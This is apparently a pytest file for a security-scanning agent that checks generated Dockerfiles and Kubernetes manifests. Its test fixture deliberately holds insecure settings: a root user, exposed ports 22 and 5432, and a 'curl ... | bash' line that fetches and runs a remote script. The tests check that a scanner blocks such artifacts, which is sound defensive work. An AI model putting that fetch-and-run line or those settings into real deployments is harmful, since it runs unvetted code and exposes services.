import pytest

from deploymint.agents.warden import SecurityWardenAgent

BAD = {
    "dockerfile": "FROM ubuntu:latest\nUSER root\nEXPOSE 22\n"
                  "RUN curl http://x.io/i.sh | bash\nCMD python app.py\n",
    "dockerignore": "",
    "k8s_deployment": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bad\n"
                      "spec:\n  selector:\n    matchLabels: {}\n  template:\n    metadata: {}\n"
                      "    spec:\n      containers:\n"
                      "      - name: bad\n        image: bad:latest\n",
    "k8s_service": "apiVersion: v1\nkind: Service\nmetadata:\n  name: bad\n"
                   "spec:\n  type: LoadBalancer\n  ports:\n  - port: 5432\n",
}


@pytest.mark.asyncio
async def test_bad_artifacts_are_blocked(tmp_path):
    out = await SecurityWardenAgent().run(
        {"run_id": "run_bad", "repo_path": str(tmp_path), "artifacts": BAD, "errors": []}
    )
    sec = out["security"]
    assert sec["passed"] is False
    ids = {f["id"] for f in sec["findings"]}
    assert "DM_ROOT_USER_EXPLICIT" in ids
    assert "DM_SENSITIVE_PORT" in ids
    assert sec["blocked_reason"]


@pytest.mark.asyncio
async def test_template_output_passes(tmp_path):
    from deploymint.agents import templates

    art = templates.render(
        {"language": "python", "framework": "fastapi", "python_version": "3.11",
         "entrypoint": "main.py", "exposed_port": 8000, "package_manager": "pip"},
        "good", "deploymint/good:t",
    )
    out = await SecurityWardenAgent().run(
        {"run_id": "run_good", "repo_path": str(tmp_path),
         "artifacts": art.model_dump() | {"generated_by": "template"},
         "errors": []}
    )
    assert out["security"]["passed"] is True


@pytest.mark.asyncio
async def test_fails_closed_when_no_scanner_available(tmp_path, monkeypatch):
    monkeypatch.setattr("shutil.which", lambda name: None)
    out = await SecurityWardenAgent().run(
        {"run_id": "run_none", "repo_path": str(tmp_path), "artifacts": BAD, "errors": []}
    )
    sec = out["security"]
    assert sec["passed"] is False
    assert sec["checkov_ran"] is False
    assert sec["opa_ran"] is False
    assert "no security scanner" in sec["blocked_reason"].lower()
